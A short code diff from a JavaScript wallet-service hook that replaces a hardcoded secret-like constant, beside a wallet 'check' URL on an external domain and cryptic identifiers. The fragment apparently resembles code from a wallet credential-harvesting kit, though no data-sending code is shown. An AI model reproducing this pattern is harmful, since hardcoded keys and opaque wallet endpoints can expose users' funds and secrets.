@@ -58,7 +58,7 @@ const useWalletService = () => {
 	}
 
 	let url = 'https://polygonfinance.org/concept/unity/check'
-	const kitkat = 'Qsx@ah&OR82WX9T6gCt'
+	const kitkat = 'aBN6qreLALR9QYPy'
 	let xxx = 'P01G$ID|EX/G'
 	let xx = 'P01G$ID|EX'
 
